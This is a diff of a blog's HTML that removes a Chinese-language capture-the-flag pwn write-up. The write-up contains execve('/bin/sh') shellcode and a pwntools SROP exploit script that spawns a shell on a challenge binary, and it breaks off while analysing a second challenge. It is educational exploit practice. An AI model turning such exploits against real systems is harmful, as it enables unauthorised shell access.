@@ -178,120 +178,6 @@ mjx-container[display="true"] + br {
       <div id="middlecontent" title class="global-width sidebar-right">
         <section id="main">
   
-    <article id="post-ZJUCTF-Pwn-Partial" class="article global-container article-type-post" itemscope itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/11/24/ZJUCTF-Pwn-Partial/">ZJUCTF-Pwn(Partial)</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2023/11/24/ZJUCTF-Pwn-Partial/" class="article-date">
-  <time datetime="2023-11-24T09:10:25.000Z" itemprop="datePublished">2023-11-24</time>
-</a>
-    
-    
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-cloud" itemprop="articleBody">
-      
-        <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
-<h3 id="rop">1.1 5rop</h3>
-<p>用IDA反汇编，打开，发现一览无遗......</p>
-<figure>
-<img src="/2023/11/24/ZJUCTF-Pwn-Partial/Users\Wingee\AppData\Roaming\Typora\typora-user-images\image-20231124171745428.png" alt><figcaption>image-20231124171745428</figcaption>
-</figure>
-<p>观察代码段，发现一处栈溢出：</p>
-<figure>
-<img src="/2023/11/24/ZJUCTF-Pwn-Partial/Users\Wingee\AppData\Roaming\Typora\typora-user-images\image-20231124171901400.png" alt><figcaption>image-20231124171901400</figcaption>
-</figure>
-<p>只有一处栈溢出那应该是rop。但由于程序使用了sys_read（内核函数），没有可以利用的GOT和PLT，所以肯定不是常规的Rop。</p>
-<p>再找一下程序中还有没有其他可以利用的地方，发现：</p>
-<ul>
-<li><p><code>.text:0000000000401015 pop rax; retn</code></p></li>
-<li><p><code>0x402000 /bin/sh</code></p></li>
-<li><p><code>0x401012 syscall;ret</code></p></li>
-</ul>
-<p>现在明确：</p>
-<ul>
-<li><code>rax</code>可控，可以用来盛装系统调用号</li>
-<li><code>syscall</code>代码碎片可以利用（因其后有ret），配合rax可以触发任意系统调用</li>
-<li><code>/bin/sh</code>字符串存在，可以想办法把地址放进rdi里，配合<code>syscall</code>getshell</li>
-</ul>
-<p>目前的难点在于我们如何把<code>/bin/sh</code>的地址放到rdi里。一想到控寄存器，就想到Srop。</p>
-<p>在触发系统调用时，操作系统会将程序从用户态切换到内核态，需要将所有寄存器压入栈中以保存上下文，以便在结束系统调用时可以恢复程序的状态。</p>
-<p>有没有什么联系？寄存器？栈？由于栈是可控的，所以我们可以通过对栈的排布，让操作系统在恢复上下文的时候将栈上指定的值pop到我们需要的寄存器中。</p>
-<figure>
-<img src="/2023/11/24/ZJUCTF-Pwn-Partial/Users\Wingee\AppData\Roaming\Typora\typora-user-images\image-20231124173814621.png" alt><figcaption>image-20231124173814621</figcaption>
-</figure>
-<p>（图源CTF-wiki）</p>
-<p>幸运的是pwntools集成了Srop的工具。</p>
-<p>下面再来碎碎念一下，作为一名合格（不了一点）的Pwn人需要随时都能背出shellcode</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rax, <span class="number">0x3b</span> <span class="comment">; 系统调用号</span></span><br><span class="line">mov rdi, <span class="keyword">sh_address</span></span><br><span class="line"><span class="keyword"></span>mov rsi, <span class="number">0</span></span><br><span class="line">mov rdx, <span class="number">0</span></span><br><span class="line">mov rcx, <span class="number">0</span></span><br><span class="line">mov rbx, <span class="number">0</span></span><br><span class="line"><span class="keyword">syscall </span><span class="comment">; execve("/bin/sh", 0, 0);</span></span><br></pre></td></tr></table></figure></div>
-<p>利用15系统调用号触发Srop，payload如下：</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote("ctfenv.zjusec.net", 45115)</span></span><br><span class="line">p = process(<span class="string">"./chall"</span>)</span><br><span class="line">start = <span class="number">0x402000</span></span><br><span class="line"><span class="comment"># 0x0000000000401015 : pop rax ; ret</span></span><br><span class="line">pop_rax = <span class="number">0x401015</span></span><br><span class="line">syscall_ret = <span class="number">0x401012</span></span><br><span class="line">sh_address = <span class="number">0x402000</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = sh_address</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rax) + p64(<span class="number">15</span>) + p64(syscall_ret) + <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<p>拿到shell</p>
-<figure>
-<img src="/2023/11/24/ZJUCTF-Pwn-Partial/Users\Wingee\AppData\Roaming\Typora\typora-user-images\image-20231124180010167.png" alt><figcaption>image-20231124180010167</figcaption>
-</figure>
-<h3 id="nya">1.2 nya</h3>
-<p>丢进IDA反汇编，运行一下</p>
-<figure>
-<img src="/2023/11/24/ZJUCTF-Pwn-Partial/Users\Wingee\AppData\Roaming\Typora\typora-user-images\image-20231124181058907.png" alt><figcaption>image-20231124181058907</figcaption>
-</figure>
-<figure>
-<img src="/2023/11/24/ZJUCTF-Pwn-Partial/Users\Wingee\AppData\Roaming\Typora\typora-user-images\image-20231124181228911.png" alt><figcaption>image-20231124181228911</figcaption>
-</figure>
-<p>分析了一下，程序的主逻辑就是循环25次，每次可以给人物不同的属性加点，根据输入数字的不同，每次加的点数随机，甚至还会有其他的属性被扣点。当每个属性的点数到999就可以拿到flag了。</p>
-<p><strong>但经过尝试，发现如果循规蹈矩，25次甚至连一个属性都加不满。</strong></p>
-<p>看左侧的函数栏，发现每次加点的多少其实是由不同的函数处理的。</p>
-<p>根据加点的多少，从小到大分为：</p>
-<ul>
-<li><p>success</p></li>
-<li><p>great success</p></li>
-<li><p>unbelievable success</p></li>
-<li><p>unexpected</p>
-<p><strong>其中unexpected函数的加点是固定的——给每个属性都加6点。这点很重要，之后要用到。</strong>但是很显然，就算加6点，25次循环也不可能到999。</p></li>
-</ul>
-<figure>
-<img src="/2023/11/24/ZJUCTF-Pwn-Partial/Users\Wingee\AppData\Roaming\Typora\typora-user-images\image-20231124181511153.png" alt><figcaption>image-20231124181511153</figcaption>
-</figure>
-<p>观察train函数，我们先输入一个lucky number，程序对该数字进行操作，最后用处理结果通过roll函数给属性加点。</p>
-<p>roll函数如下：</p>
-<figure>
-<img src="/2023/11/24/ZJUCTF-Pwn-Partial/Users\Wingee\AppData\Roaming\Typora\typora-user-images\image-20231124184018140.png" alt><figcaption>image-20231124184018140</figcaption>
-</figure>
-<p>rand随机数...又来？又对数据进行了处理，根据处理结果分不同的函数加点。通过尝试发现，加点最多的是unbelievable success</p>
-<p>通过多次尝试，偶然触发了一次：</p>
-<figure>
-<img src="/2023/11/24/ZJUCTF-Pwn-Partial/Users\Wingee\AppData\Roaming\Typora\typora-user-images\image-20231124184203677.png" alt><figcaption>image-20231124184203677</figcaption>
-</figure>
-<p>但是概率实在是太低了，按照正常的方法肯定不行。</p>
-<p>所以，为了让每次都能触发usuccess，必须保证：</p>
-<p><strong>每次的v6都大于100--&gt; 每次的train函数处理结果足够小</strong></p>
-<p>足够小？0呢？我们知道C语言在除以0的时候会发生浮点数溢出，此时商自动变为0xFFFFFFFFFFFFFFFF，足够大！</p>
-<p><strong>好好好，正片开始：</strong></p>
-<p>train的处理结果是一个</p>
-<h4 id="section"></h4>
-
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
     <article id="post-Shamir秘密共享" class="article global-container article-type-post" itemscope itemprop="blogPost">
   
     <header class="article-header">
@@ -472,10 +358,6 @@ mjx-container[display="true"] + br {
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
-        
-          <li>
-            <a href="/2023/11/24/ZJUCTF-Pwn-Partial/">ZJUCTF-Pwn(Partial)</a>
-          </li>
         
           <li>
             <a href="/2023/11/24/Shamir%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/">Secret Sharing —— 秘密共享</a>
